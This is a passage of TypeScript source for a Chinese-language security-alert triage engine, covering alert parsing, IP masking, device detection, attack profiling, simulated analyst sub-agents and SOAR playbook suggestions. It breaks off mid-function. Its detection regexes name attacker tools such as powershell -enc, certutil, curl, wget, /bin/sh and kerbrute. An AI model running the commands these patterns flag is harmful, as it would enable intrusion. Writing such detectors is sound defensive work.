export type AlertSeverity = 'critical' | 'high' | 'medium' | 'low'
export type AlertCriticality = 'critical' | 'high' | 'medium' | 'low'
export type AlertVerdict = 'confirmed' | 'suspicious' | 'noise'
export type AlertPriority = 'P1' | 'P2' | 'P3' | 'P4'

export interface SecurityAlert {
  alert_id: string
  occurred_at: string
  source_ip: string
  destination_ip: string
  destination_port: number
  username: string
  asset_id: string
  asset_name: string
  asset_criticality: AlertCriticality
  alert_type: string
  severity: AlertSeverity
  action: string
  rule_name: string
  source_country: string
  failed_login_count: number
  login_succeeded: boolean
  cve: string
  internet_exposed: boolean
  threat_intel_score: number
  process_name: string
  command_line: string
  source: string
  raw_event: string
  device_id: string
  payload: string
}

export interface AgentFinding {
  id: string
  name: string
  status: 'completed'
  score: number
  level: 'high' | 'medium' | 'low'
  finding: string
  evidence: string[]
}

/** 安全设备画像 —— 从 payload 内容与关联设备 ID 识别 */
export type DeviceCategory = 'waf' | 'firewall' | 'ips' | 'ids' | 'flow-probe' | 'edr' | 'iam' | 'db-audit' | 'vuln-scanner' | 'unknown'

export interface SecurityDevice {
  device_id: string
  name: string
  category: DeviceCategory
  vendor: string
  hit: string
}

/** 子智能体分析步骤（业务逻辑规则的命中记录） */
export interface AgentAnalysisStep {
  hit: boolean
  rule: string
  detail: string
}

/** 子智能体 —— 安全指挥官下发的研判单元 */
export interface InvestigationAgent {
  id: string
  name: string
  icon: string
  role: string
  task: string
  input: string
  conclusion: string
  confidence: number
  level: 'high' | 'medium' | 'low'
  evidence: string[]
  analysis: AgentAnalysisStep[]
}

/** 安全指挥官调度记录 */
export interface CommanderDecision {
  commander_id: string
  commander_name: string
  decision: string
  attack_profile: string
  dispatched: InvestigationAgent[]
}

/** SOAR 处置剧本 */
export interface SoarPlaybook {
  playbook_id: string
  name: string
  script: string
  actions: string[]
  risk: 'low' | 'medium' | 'high'
  approval_required: boolean
  trigger: string
}

export interface SoarExecution {
  playbook: SoarPlaybook
  status: 'suggested'
  note: string
}

export interface TriageCase {
  case_id: string
  representative: SecurityAlert
  alerts: SecurityAlert[]
  first_seen: string
  last_seen: string
  verdict: AlertVerdict
  priority: AlertPriority
  risk_score: number
  confidence: number
  summary: string
  reason: string
  recommendations: string[]
  findings: AgentFinding[]
  plan: string[]
  device: SecurityDevice
  commander: CommanderDecision
  soar: SoarExecution[]
}

export interface TriageSummary {
  source_count: number
  case_count: number
  suppressed_count: number
  reduction_rate: number
  high_risk_count: number
  suspicious_count: number
  noise_count: number
  device_count: number
}

export const ALERT_TEMPLATE_FIELDS = [
  'alert_id', 'occurred_at', 'source_ip', 'destination_ip', 'destination_port', 'username',
  'asset_id', 'asset_name', 'asset_criticality', 'alert_type', 'severity', 'action', 'rule_name',
  'source_country', 'failed_login_count', 'login_succeeded', 'cve', 'internet_exposed',
  'threat_intel_score', 'process_name', 'command_line', 'source', 'raw_event', 'device_id', 'payload',
] as const

const requiredFields = ['alert_id', 'source_ip', 'destination_ip', 'alert_type', 'severity'] as const

const fieldAliases: Record<string, string> = {
  id: 'alert_id', event_id: 'alert_id', 告警编号: 'alert_id', 告警id: 'alert_id', 告警id编号: 'alert_id', 告警id号: 'alert_id',
  timestamp: 'occurred_at', event_time: 'occurred_at', time: 'occurred_at', 告警时间: 'occurred_at',
  src_ip: 'source_ip', client_ip: 'source_ip', 源ip: 'source_ip', 来源ip: 'source_ip', 源地址: 'source_ip', 攻击ip: 'source_ip',
  dst_ip: 'destination_ip', target_ip: 'destination_ip', 目的ip: 'destination_ip', 目标ip: 'destination_ip', 目的地址: 'destination_ip', 受害ip: 'destination_ip',
  dst_port: 'destination_port', port: 'destination_port', 目的端口: 'destination_port', 目标端口: 'destination_port',
  user: 'username', account: 'username', 用户名: 'username', 账号: 'username', 源用户名: 'username',
  asset: 'asset_name', host_name: 'asset_name', 资产名称: 'asset_name', 目标资产: 'asset_name',
  criticality: 'asset_criticality', 资产等级: 'asset_criticality',
  event_type: 'alert_type', category: 'alert_type', 告警类型: 'alert_type', 告警名称: 'alert_type', 事件名称: 'alert_type',
  level: 'severity', 告警级别: 'severity', 告警等级: 'severity', 事件等级: 'severity',
  disposition: 'action', 处置动作: 'action', 攻击结果: 'action',
  rule: 'rule_name', signature: 'rule_name', 规则名称: 'rule_name', 攻击方向: 'rule_name', 检测规则: 'rule_name',
  country: 'source_country', 源国家: 'source_country',
  fail_count: 'failed_login_count', 失败次数: 'failed_login_count', 关联日志数: 'failed_login_count',
  success_after_fail: 'login_succeeded', 登录成功: 'login_succeeded', 失陷状态: 'login_succeeded',
  vuln_id: 'cve', 漏洞编号: 'cve',
  exposed: 'internet_exposed', 公网暴露: 'internet_exposed',
  ti_score: 'threat_intel_score', 情报分: 'threat_intel_score', 风险分: 'threat_intel_score',
  process: 'process_name', 进程名: 'process_name',
  command: 'command_line', 命令行: 'command_line',
  data_source: 'source', 数据源: 'source', 设备类型: 'source',
  raw: 'raw_event', 原始事件: 'raw_event',
  关联设备id: 'device_id', 设备id: 'device_id', 设备编号: 'device_id',
  payload: 'payload', 原始载荷: 'payload',
}

const severityMap: Record<string, AlertSeverity> = {
  critical: 'critical', 严重: 'critical', 紧急: 'critical', 危急: 'critical', 致命: 'critical', 高危: 'high',
  high: 'high', 高: 'high',
  medium: 'medium', 中: 'medium', 中危: 'medium',
  low: 'low', 低: 'low', 低危: 'low',
}

function resolveSeverity(value: string): AlertSeverity | null {
  const v = value.trim().toLowerCase()
  if (severityMap[v]) return severityMap[v]
  const bracket = v.match(/\(([a-z]+)\)/)
  if (bracket && severityMap[bracket[1]]) return severityMap[bracket[1]]
  const zh = v.replace(/[^一-龥]/g, '')
  if (zh && severityMap[zh]) return severityMap[zh]
  return null
}

const criticalityMap: Record<string, AlertCriticality> = {
  critical: 'critical', 核心: 'critical',
  high: 'high', 高: 'high',
  medium: 'medium', 中: 'medium',
  low: 'low', 低: 'low',
}

function clamp(value: number, min = 0, max = 100) {
  return Math.min(max, Math.max(min, Math.round(value)))
}

function asBoolean(value: unknown) {
  return ['true', '1', 'yes', 'y', '是', '成功'].includes(String(value ?? '').trim().toLowerCase())
}

function asNumber(value: unknown, fallback = 0) {
  const parsed = Number(value)
  return Number.isFinite(parsed) ? parsed : fallback
}

function privateAddress(ip: string) {
  return /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)
}

function normalizeRow(input: Record<string, unknown>, rowNumber: number): SecurityAlert {
  const source: Record<string, unknown> = {}
  for (const [rawKey, value] of Object.entries(input)) {
    const key = rawKey.trim().toLowerCase()
    source[fieldAliases[key] || key] = value
  }
  const missing = requiredFields.filter(field => String(source[field] ?? '').trim() === '')
  if (missing.length) throw new Error(`第 ${rowNumber} 行缺少必填字段：${missing.join(', ')}`)

  const occurredRaw = String(source.occurred_at || '').trim()
  const occurredAt = occurredRaw ? new Date(occurredRaw) : new Date()
  if (occurredRaw && Number.isNaN(occurredAt.getTime())) throw new Error(`第 ${rowNumber} 行 occurred_at 不是有效时间`)
  const severityValue = String(source.severity || '').trim().toLowerCase()
  const resolvedSeverity = resolveSeverity(severityValue)
  if (!resolvedSeverity) throw new Error(`第 ${rowNumber} 行 severity 应为 critical/high/medium/low`)

  const payloadText = typeof source.payload === 'string' ? source.payload : JSON.stringify(source.payload ?? {})
  const alertType = String(source.alert_type).trim()
  const ruleName = String(source.rule_name || alertType).trim()

  return {
    alert_id: String(source.alert_id).trim(),
    occurred_at: occurredAt.toISOString(),
    source_ip: maskIp(String(source.source_ip).trim()),
    destination_ip: maskIp(String(source.destination_ip).trim()),
    destination_port: asNumber(source.destination_port),
    username: String(source.username || '').trim(),
    asset_id: String(source.asset_id || '').trim(),
    asset_name: String(source.asset_name || '').trim(),
    asset_criticality: criticalityMap[String(source.asset_criticality || 'medium').trim().toLowerCase()] || 'medium',
    alert_type: alertType,
    severity: resolvedSeverity,
    action: String(source.action || 'observed').trim(),
    rule_name: ruleName,
    source_country: String(source.source_country || '未知').trim(),
    failed_login_count: asNumber(source.failed_login_count),
    login_succeeded: asBoolean(source.login_succeeded),
    cve: String(source.cve || '').trim(),
    internet_exposed: asBoolean(source.internet_exposed),
    threat_intel_score: clamp(asNumber(source.threat_intel_score)),
    process_name: String(source.process_name || '').trim(),
    command_line: String(source.command_line || '').trim(),
    source: String(source.source || 'SIEM').trim(),
    raw_event: typeof source.raw_event === 'string' ? maskIp(source.raw_event) : maskIp(JSON.stringify(source.raw_event || {})),
    device_id: String(source.device_id ?? '').trim(),
    payload: maskIp(payloadText),
  }
}

function parseCsvRows(content: string): string[][] {
  const rows: string[][] = []
  let row: string[] = []
  let cell = ''
  let quoted = false
  for (let index = 0; index < content.length; index += 1) {
    const char = content[index]
    if (char === '"' && quoted && content[index + 1] === '"') {
      cell += '"'
      index += 1
    } else if (char === '"') {
      quoted = !quoted
    } else if (char === ',' && !quoted) {
      row.push(cell)
      cell = ''
    } else if ((char === '\n' || char === '\r') && !quoted) {
      if (char === '\r' && content[index + 1] === '\n') index += 1
      row.push(cell)
      if (row.some(item => item.trim())) rows.push(row)
      row = []
      cell = ''
    } else {
      cell += char
    }
  }
  row.push(cell)
  if (row.some(item => item.trim())) rows.push(row)
  return rows
}

/** 自动检测文件编码：优先 UTF-8，出现替换字符时回退 GB18030（国内安全设备导出常见） */
export function decodeAlertFile(buffer: ArrayBuffer): string {
  const utf8 = new TextDecoder('utf-8', { fatal: false })
  const text = utf8.decode(buffer)
  const replacementCount = (text.match(/\uFFFD/g) || []).length
  if (replacementCount > 0 && text.length > 0) {
    try {
      const gbText = new TextDecoder('gb18030').decode(buffer)
      // 仅当回退解码后不再出现替换字符时采用，避免误伤
      if ((gbText.match(/\uFFFD/g) || []).length === 0) return gbText
    } catch {
      // fall through to utf-8 result
    }
  }
  return text
}

/** 将文本中的 IPv4 地址脱敏为保留前两段：203.0.113.44 → 203.0.*.* */
export function maskIp(text: string): string {
  return text.replace(/\b(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}\b/g, '$1.$2.*.*')
}

function normalizeRows(rows: Record<string, unknown>[]): SecurityAlert[] {
  if (!rows.length) throw new Error('文件中没有告警记录')
  if (rows.length > 5000) throw new Error('单次最多导入 5,000 条告警')
  const alerts = rows.map((row, index) => normalizeRow(row, index + 2))
  // 同一 alert_id 可能被多台上报（同一告警多条记录）：保留全部，追加序号后缀避免冲突
  const seenIds = new Map<string, number>()
  for (const alert of alerts) {
    const count = seenIds.get(alert.alert_id) || 0
    seenIds.set(alert.alert_id, count + 1)
    if (count > 0) alert.alert_id = `${alert.alert_id}#${count + 1}`
  }
  return alerts
}

export function parseAlertFile(content: string, filename: string): SecurityAlert[] {
  let rows: Record<string, unknown>[]
  if (filename.toLowerCase().endsWith('.json')) {
    const parsed = JSON.parse(content) as unknown
    const records = Array.isArray(parsed) ? parsed : (parsed as { alerts?: unknown[] })?.alerts
    if (!Array.isArray(records)) throw new Error('JSON 须为告警数组，或包含 alerts 数组')
    rows = records as Record<string, unknown>[]
  } else {
    const table = parseCsvRows(content.replace(/^\uFEFF/, ''))
    if (table.length < 2) throw new Error('CSV 至少需要表头和一行告警记录')
    const headers = table[0].map(value => value.trim())
    rows = table.slice(1).map(values => Object.fromEntries(headers.map((header, index) => [header, values[index] ?? ''])))
  }
  return normalizeRows(rows)
}

/** 从 Excel 解析的行矩阵（首行为表头）解析告警，供 xlsx 导入复用 */
export function parseAlertMatrix(matrix: unknown[][]): SecurityAlert[] {
  if (!matrix.length || matrix.length < 2) throw new Error('Excel 至少需要表头和一行告警记录')
  const headers = matrix[0].map(value => String(value ?? '').trim())
  const rows = matrix.slice(1).map(values => Object.fromEntries(headers.map((header, index) => [header, values[index] ?? ''])))
  return normalizeRows(rows)
}

/* ─────────────────────────── 安全设备识别 ─────────────────────────── */

export const DEVICE_CATEGORY_LABEL: Record<DeviceCategory, string> = {
  waf: 'Web 应用防火墙', firewall: '边界防火墙', ips: '入侵防御系统', ids: '入侵检测系统',
  'flow-probe': '流量探针', edr: '终端检测响应', iam: '身份认证审计', 'db-audit': '数据库审计',
  'vuln-scanner': '漏洞扫描平台', unknown: '综合安全网关',
}

interface DeviceRule {
  category: DeviceCategory
  name: string
  vendor: string
  pattern: RegExp
}

const DEVICE_RULES: DeviceRule[] = [
  { category: 'flow-probe', name: '网络流量探针', vendor: '流量检测引擎', pattern: /udp\.payload\s*[=:]\s*\S|tcp\.payload\s*[=:]\s*\S|dns\.qry|flow\.bytes|五元组|会话|流量/i },
  { category: 'edr', name: '终端检测响应', vendor: '终端安全代理', pattern: /进程名[：:]\s*\S|process_name\s*=|命令行|powershell|注册表|注入|encodedcommand|certutil/i },
  { category: 'iam', name: '身份认证审计', vendor: '身份与访问管理', pattern: /登录用户|登录名|认证失败|连续失败|口令|MFA|SSO|LDAP|ssh\.auth|kerberos|票据|域控/i },
  { category: 'waf', name: 'Web 应用防火墙', vendor: 'Web 防护网关', pattern: /HTTP请求URL[：:]\s*\S|HTTP请求头[：:]\s*\S|http_request|request_uri|url_decode|waf_rule|防护规则|web攻击|目录扫描|路径枚举/i },
  { category: 'db-audit', name: '数据库审计', vendor: '数据库审计系统', pattern: /SQL语句|数据库|sqlmap|select\s|insert\s|update\s|delete\s|表名/i },
  { category: 'vuln-scanner', name: '漏洞扫描平台', vendor: '漏洞评估引擎', pattern: /CVE-\d|漏洞|exploit|POC|nuclei|nessus/i },
  { category: 'ips', name: '入侵防御系统', vendor: 'IPS 引擎', pattern: /IPS|拒绝|阻断|拦截|drop\b|signature|攻击特征/i },
  { category: 'ids', name: '入侵检测系统', vendor: 'IDS 引擎', pattern: /IDS|snort|suricata|检测规则|规则命中/i },
]

const DEVICE_ID_MAP: Record<string, { category: DeviceCategory; name: string; vendor: string }> = {
  '1': { category: 'firewall', name: '边界防火墙', vendor: '下一代防火墙' },
  '2': { category: 'ids', name: '入侵检测系统', vendor: 'IDS 引擎' },
  '3': { category: 'ips', name: '入侵防御系统', vendor: 'IPS 引擎' },
  '4': { category: 'waf', name: 'Web 应用防火墙', vendor: 'Web 防护网关' },
  '5': { category: 'edr', name: '终端检测响应', vendor: '终端安全代理' },
  '6': { category: 'iam', name: '身份认证审计', vendor: '身份与访问管理' },
  '7': { category: 'db-audit', name: '数据库审计', vendor: '数据库审计系统' },
  '8': { category: 'vuln-scanner', name: '漏洞扫描平台', vendor: '漏洞评估引擎' },
  '9': { category: 'flow-probe', name: '网络流量探针', vendor: '流量检测引擎' },
}

/** 根据 payload 内容与关联设备 ID 识别告警来源设备 */
export function detectDevice(alert: Pick<SecurityAlert, 'payload' | 'device_id' | 'source' | 'alert_type' | 'rule_name'>): SecurityDevice {
  const corpus = `${alert.payload} ${alert.alert_type} ${alert.rule_name} ${alert.source}`
  for (const rule of DEVICE_RULES) {
    if (rule.pattern.test(corpus)) {
      return { device_id: alert.device_id || 'auto', name: rule.name, category: rule.category, vendor: rule.vendor, hit: rule.pattern.source }
    }
  }
  const mapped = alert.device_id ? DEVICE_ID_MAP[alert.device_id.trim()] : null
  if (mapped) return { device_id: alert.device_id, name: mapped.name, category: mapped.category, vendor: mapped.vendor, hit: `关联设备ID ${alert.device_id}` }
  return { device_id: alert.device_id || 'unknown', name: '综合安全网关', category: 'unknown', vendor: '多源汇聚平台', hit: '未命中设备特征，按汇聚平台处理' }
}

/* ─────────────────────────── 子智能体库与攻击画像 ─────────────────────────── */

export const COMMANDER = {
  id: 'blue-commander',
  name: '安全指挥官',
  icon: '◆',
  role: '接收已降噪告警，识别来源设备，拆解并分派研判任务',
  logic: [
    '校验输入：payload 完整性与来源/目的 IP 有效性、攻击方向',
    '设备识别：解析 payload 字段与关联设备 ID，判定来源安全设备',
    '画像判定：按告警类型、规则与载荷特征匹配攻击场景',
    '任务拆解：按画像选择子智能体组合，并行下发研判任务',
    '证据融合：汇总子智能体结论，输出综合研判结论与置信度',
    'SOAR 匹配：按结论 × 画像 × 设备匹配处置剧本，生成处置建议',
  ],
}

interface SubAgentDef {
  name: string
  icon: string
  role: string
  logic: string[]
}

export const SUB_AGENT_DEFS: Record<string, SubAgentDef> = {
  'flow-analyst': {
    name: '流量分析智能体', icon: '≋', role: '网络会话、协议与流量特征分析',
    logic: [
      '统计同源 IP 触达目标数量，判断是否呈横向扫描特征',
      '分析协议与端口组合，识别隧道化或非常规封装',
      '对比会话频率与基线，标记突发流量与大规模探测',
    ],
  },
  'iam-analyst': {
    name: '身份认证智能体', icon: '⌬', role: '账号、认证行为与凭据安全分析',
    logic: [
      '统计短时认证失败次数，识别口令猜测 / 暴力破解',
      '检查失败后是否出现成功登录，评估凭据泄露风险',
      '核查账号权限等级，高权限或管理账号风险加权',
    ],
  },
  'intel-analyst': {
    name: '威胁情报智能体', icon: '◉', role: 'IP / 样本 / 漏洞情报交叉核验',
    logic: [
      '将来源 IP 与外部情报库交叉比对，获取威胁标签与评分',
      '核验漏洞编号（CVE）公开利用状态与可用性',
      '关联历史事件，识别重复攻击者与已知攻击组织',
    ],
  },
  'host-analyst': {
    name: '主机行为智能体', icon: '▤', role: '进程、文件与登录行为审计',
    logic: [
      '审计目标主机进程与命令行，识别编码 / 混淆执行',
      '检查文件外联、持久化与注册表写入痕迹',
      '评估失陷主机重要度与业务影响范围',
    ],
  },
  'web-analyst': {
    name: 'Web 安全智能体', icon: 'W', role: 'Web 攻击载荷与利用链分析',
    logic: [
      '解析请求 URL、参数与载荷，匹配注入 / 上传 / RCE 特征',
      '对照漏洞编号与公开利用链，评估漏洞可利用性',
      '检查响应状态码与拦截记录，判断攻击是否生效',
    ],
  },
  'sample-analyst': {
    name: '恶意样本智能体', icon: 'M', role: '样本静态特征与行为提取',
    logic: [
      '提取样本哈希、文件类型与签名特征',
      '分析命令行编码载荷（-enc / Base64 / certutil）',
      '映射已知恶意家族行为模式与 IOC',
    ],
  },
  'path-analyst': {
    name: '攻击路径智能体', icon: '↝', role: '攻击链还原与影响范围评估',
    logic: [
      '以最小证据集构建攻击链（源 → 跳板 → 目标）',
      '评估横向移动可能性与受影响资产清单',
      '输出影响面供处置决策与优先级排序',
    ],
  },
}

interface AttackProfile {
  id: string
  name: string
  pattern: RegExp
  agents: string[]
}

const ATTACK_PROFILES: AttackProfile[] = [
  { id: 'kerberos', name: '域内横向移动', pattern: /kerbrute|kerberos|krbtgt|票据|域控|域内|横向|as-rep|tgt/i, agents: ['flow-analyst', 'iam-analyst', 'intel-analyst'] },
  { id: 'brute-force', name: '暴力破解', pattern: /暴力|爆破|brute|弱口令|连续失败|认证失败|口令猜测/i, agents: ['iam-analyst', 'intel-analyst', 'host-analyst'] },
  { id: 'web-exploit', name: 'Web 攻击利用', pattern: /web|注入|sql注入|xss|上传|webshell|rce|漏洞利用|目录扫描|路径枚举|异常请求|web 漏洞/i, agents: ['web-analyst', 'flow-analyst', 'intel-analyst'] },
  { id: 'malware', name: '恶意代码执行', pattern: /木马|勒索|恶意|样本|挖矿|后门|编码命令|enc|powershell|payload/i, agents: ['sample-analyst', 'host-analyst', 'intel-analyst'] },
  { id: 'scan', name: '侦察扫描', pattern: /扫描|探测|侦察|枚举|recon|probe|sweep/i, agents: ['flow-analyst', 'intel-analyst'] },
  { id: 'generic', name: '通用异常', pattern: /.*/i, agents: ['intel-analyst', 'host-analyst', 'path-analyst'] },
]

export function resolveAttackProfile(alert: Pick<SecurityAlert, 'alert_type' | 'rule_name' | 'payload' | 'command_line'>): AttackProfile {
  const corpus = `${alert.alert_type} ${alert.rule_name} ${alert.payload} ${alert.command_line}`
  return ATTACK_PROFILES.find(profile => profile.pattern.test(corpus)) || ATTACK_PROFILES[ATTACK_PROFILES.length - 1]
}

/* ─────────────────────────── SOAR 剧本库 ─────────────────────────── */

export const SOAR_PLAYBOOKS: SoarPlaybook[] = [
  { playbook_id: 'SOAR-PL-001', name: '源 IP 自动阻断', script: 'soar_scripts/block_source_ip.py', actions: ['在边界防火墙下发源 IP 阻断规则', '同步威胁情报黑名单', '对高危来源追加 24h 观察窗口'], risk: 'high', approval_required: true, trigger: '确认攻击来源为外部 IP 且行为明确' },
  { playbook_id: 'SOAR-PL-002', name: '账号锁定与凭据轮换', script: 'soar_scripts/rotate_credentials.py', actions: ['锁定受影响账号并终止会话', '强制重置口令 / 轮换凭据', '开启账号后续登录审计'], risk: 'high', approval_required: true, trigger: '身份类攻击确认成功或凭据疑似泄露' },
  { playbook_id: 'SOAR-PL-003', name: 'WAF 规则即时下发', script: 'soar_scripts/deploy_waf_rule.py', actions: ['下发虚拟补丁与攻击特征规则', '封禁对应 URI / 载荷特征', '开启请求全量日志增强'], risk: 'medium', approval_required: false, trigger: 'Web 攻击特征明确且来源可收敛' },
  { playbook_id: 'SOAR-PL-004', name: '主机隔离与取证', script: 'soar_scripts/isolate_host.py', actions: ['对失陷主机断网隔离', '执行内存与磁盘取证', 'EDR 全盘扫描并提取 IOC'], risk: 'high', approval_required: true, trigger: '主机失陷证据充分或恶意代码确认执行' },
  { playbook_id: 'SOAR-PL-005', name: '威胁情报交叉核验', script: 'soar_scripts/enrich_threat_intel.py', actions: ['查询外部情报源（VT / 微步等）', '关联历史事件与情报标签', '输出情报核验报告'], risk: 'low', approval_required: false, trigger: '来源指标需要外部情报确认' },
  { playbook_id: 'SOAR-PL-006', name: '日志留存增强', script: 'soar_scripts/enable_log_audit.py', actions: ['调整关键设备日志策略', '备份事件前后 30 分钟日志', '设置留存周期 ≥ 180 天'], risk: 'low', approval_required: false, trigger: '事件需要审计追溯或证据保全' },
  { playbook_id: 'SOAR-PL-007', name: '域凭据安全加固', script: 'soar_scripts/harden_domain_credentials.py', actions: ['检测 krbtgt 票据与黄金票据痕迹', '轮换域管理员凭据', '禁用空密码 / 弱加密 Kerberos 配置'], risk: 'high', approval_required: true, trigger: 'Kerberos 票据伪造或域横向攻击确认' },
  { playbook_id: 'SOAR-PL-008', name: '同源攻击面收敛', script: 'soar_scripts/contain_same_source.py', actions: ['收敛同源 IP 全部会话', '下发端口 / 协议访问控制', '将相同主体后续告警自动关联'], risk: 'medium', approval_required: true, trigger: '同源高频触达多个目标，呈扫描或横向特征' },
]

function matchSoarPlaybooks(verdict: AlertVerdict, profile: AttackProfile, device: SecurityDevice, alert: Pick<SecurityAlert, 'source_ip' | 'destination_ip' | 'username' | 'internet_exposed'>): SoarPlaybook[] {
  const externalSource = !privateAddress(alert.source_ip)
  const matches: SoarPlaybook[] = []
  const add = (id: string) => {
    const playbook = SOAR_PLAYBOOKS.find(item => item.playbook_id === id)
    if (playbook && !matches.some(item => item.playbook_id === id)) matches.push(playbook)
  }

  if (verdict === 'confirmed') {
    if (profile.id === 'kerberos') { add('SOAR-PL-001'); add('SOAR-PL-007'); add('SOAR-PL-006'); add('SOAR-PL-002') }
    else if (profile.id === 'web-exploit') { add('SOAR-PL-003'); add('SOAR-PL-001'); add('SOAR-PL-006') }
    else if (profile.id === 'brute-force') { add('SOAR-PL-001'); add('SOAR-PL-002'); add('SOAR-PL-006') }
    else if (profile.id === 'malware') { add('SOAR-PL-004'); add('SOAR-PL-005'); add('SOAR-PL-006') }
    else if (profile.id === 'scan') { add('SOAR-PL-008'); add('SOAR-PL-001') }
    else { add('SOAR-PL-001'); add('SOAR-PL-006') }
    if (externalSource && !matches.some(item => item.playbook_id === 'SOAR-PL-001')) add('SOAR-PL-001')
  } else if (verdict === 'suspicious') {
    add('SOAR-PL-005'); add('SOAR-PL-006')
    if (device.category === 'waf' || device.category === 'ips') add('SOAR-PL-003')
    if (profile.id === 'malware' || profile.id === 'kerberos') add('SOAR-PL-004')
  } else {
    add('SOAR-PL-006')
  }
  return matches.slice(0, 3)
}

/* ─────────────────────────── 分析引擎 ─────────────────────────── */

function fingerprint(alert: SecurityAlert) {
  return [alert.source_ip, alert.destination_ip, alert.destination_port, alert.username, alert.alert_type, alert.rule_name].join('|').toLowerCase()
}

function groupAlerts(alerts: SecurityAlert[]): SecurityAlert[][] {
  const buckets = new Map<string, SecurityAlert[][]>()
  for (const alert of [...alerts].sort((a, b) => Date.parse(a.occurred_at) - Date.parse(b.occurred_at))) {
    const key = fingerprint(alert)
    const groups = buckets.get(key) || []
    const current = groups.at(-1)
    if (current && Date.parse(alert.occurred_at) - Date.parse(current.at(-1)!.occurred_at) <= 10 * 60 * 1000) current.push(alert)
    else groups.push([alert])
    buckets.set(key, groups)
  }
  return Array.from(buckets.values()).flat()
}

function createFinding(id: string, name: string, score: number, finding: string, evidence: string[]): AgentFinding {
  const normalized = clamp(score)
  return { id, name, status: 'completed', score: normalized, level: normalized >= 65 ? 'high' : normalized >= 35 ? 'medium' : 'low', finding, evidence }
}

/** 生成子智能体研判结论 */
function buildSubAgent(
  id: string,
  task: string,
  input: string,
  finding: AgentFinding,
  fallbackConclusion: string,
): InvestigationAgent {
  const def = SUB_AGENT_DEFS[id]
  const conclusion = finding.score >= 65
    ? finding.finding
    : finding.score >= 35
      ? `${finding.finding}，需结合其他维度证据复核。`
      : fallbackConclusion
  const hitCount = Math.max(1, Math.ceil(def.logic.length * (finding.score / 100)))
  const analysis = def.logic.map((rule, index) => ({
    hit: index < hitCount,
    rule,
    detail: index < hitCount ? (finding.evidence[index] || finding.evidence[0] || '特征命中') : '未达到判定阈值',
  }))
  return {
    id,
    name: def.name,
    icon: def.icon,
    role: def.role,
    task,
    input,
    conclusion,
    confidence: clamp(finding.score),
    level: finding.level,
    evidence: finding.evidence,
    analysis,
  }
}

function dispatchInvestigation(
  alert: SecurityAlert,
  profile: AttackProfile,
  device: SecurityDevice,
  findings: AgentFinding[],
  group: SecurityAlert[],
): InvestigationAgent[] {
  const findingOf = (id: string) => findings.find(item => item.id === id) || findings[0]
  const byProfile: Record<string, { id: string; task: string }[]> = {
    kerberos: [
      { id: 'flow-analyst', task: `分析 ${alert.destination_ip}:${alert.destination_port || 'UDP'} 上的 Kerberos 流量特征，识别票据伪造与横向移动痕迹` },
      { id: 'iam-analyst', task: `核查 ${alert.username || '域账号'} 的认证方式与凭据状态，评估空密码 / 弱加密 Kerberos 风险` },
      { id: 'intel-analyst', task: `对 ${alert.source_ip} 与 ${alert.destination_ip} 做威胁情报交叉核验` },
    ],
    'brute-force': [
      { id: 'iam-analyst', task: `分析 ${alert.destination_ip} 上账号 ${alert.username || '(未知)'} 的失败登录序列与成功迹象` },
      { id: 'intel-analyst', task: `核验来源 ${alert.source_ip} 的历史恶意活动与威胁标签` },
      { id: 'host-analyst', task: `审计 ${alert.destination_ip} 上 ${alert.process_name || '认证进程'} 的登录行为日志` },
    ],
    'web-exploit': [
      { id: 'web-analyst', task: `解析 ${device.name} 上报的 Web 载荷，识别利用链与漏洞特征` },
      { id: 'flow-analyst', task: `还原 ${alert.source_ip} → ${alert.destination_ip} 的请求会话与响应状态` },
      { id: 'intel-analyst', task: `核验漏洞 ${alert.cve || '(未提供)'} 与来源 IP 的情报信息` },
    ],
    malware: [
      { id: 'sample-analyst', task: `提取 ${alert.process_name || '可疑进程'} 与命令行特征，判定恶意代码属性` },
      { id: 'host-analyst', task: `审计 ${alert.destination_ip} 上的进程 / 文件 / 外联行为` },
      { id: 'intel-analyst', task: `核验样本 IOC 与来源 IP 威胁情报` },
    ],
    scan: [
      { id: 'flow-analyst', task: `统计 ${alert.source_ip} 触达目标数量与请求频率，判断扫描规模` },
      { id: 'intel-analyst', task: `核验来源 ${alert.source_ip} 的扫描器指纹与情报标签` },
    ],
    generic: [
      { id: 'intel-analyst', task: `核验 ${alert.source_ip} 与 ${alert.destination_ip} 的威胁情报` },
      { id: 'host-analyst', task: `审计 ${alert.destination_ip} 的主机行为证据` },
      { id: 'path-analyst', task: `基于现有证据构建最小可信攻击路径` },
    ],
  }

  const tasks = byProfile[profile.id] || byProfile.generic
  return tasks.map(item => {
    const finding = findingOf(item.id === 'flow-analyst' ? 'source-ip' : item.id === 'iam-analyst' ? 'account' : item.id === 'intel-analyst' ? 'threat-intel' : item.id === 'host-analyst' ? 'host-audit' : item.id === 'web-analyst' ? 'vulnerability' : item.id === 'sample-analyst' ? 'host-audit' : 'victim-ip')
    return buildSubAgent(item.id, item.task, `${device.name} · ${alert.source_ip} → ${alert.destination_ip}${alert.destination_port ? ':' + alert.destination_port : ''} · 归并 ${group.length} 条告警`, finding, '未发现显著异常特征，按常规记录。')
  })
}

function analyzeGroup(group: SecurityAlert[], allAlerts: SecurityAlert[], index: number): TriageCase {
  const alert = group.reduce((best, item) => item.threat_intel_score > best.threat_intel_score ? item : best, group[0])
  const sourceAlerts = allAlerts.filter(item => item.source_ip === alert.source_ip)
  const victimAlerts = allAlerts.filter(item => item.destination_ip === alert.destination_ip)
  const uniqueTargets = new Set(sourceAlerts.map(item => item.destination_ip)).size
  const totalFailures = group.reduce((sum, item) => sum + item.failed_login_count, 0)
  const hasSuccess = group.some(item => item.login_succeeded)
  const adminAccount = /admin|root|administrator|运维|系统/i.test(alert.username)
  const suspiciousCommand = /(?:powershell|cmd\.exe|\/bin\/sh|curl\s|wget\s|certutil|encodedcommand|-enc\b)/i.test(`${alert.process_name} ${alert.command_line}`)
  const blocked = /block|deny|drop|拦截|阻断/i.test(alert.action)
  const trustedAutomation = privateAddress(alert.source_ip) && /health|monitor|scanner|巡检|监控|基线/i.test(`${alert.rule_name} ${alert.alert_type} ${alert.username}`)

  const intelScore = alert.threat_intel_score || (privateAddress(alert.source_ip) ? 8 : 28)
  const sourceScore = clamp(sourceAlerts.length * 6 + uniqueTargets * 12 + (alert.internet_exposed ? 8 : 0))
  const accountScore = clamp(totalFailures * 4 + (hasSuccess ? 42 : 0) + (adminAccount ? 18 : 0))
  const hostScore = clamp((suspiciousCommand ? 72 : 12) + (alert.severity === 'critical' ? 18 : 0))
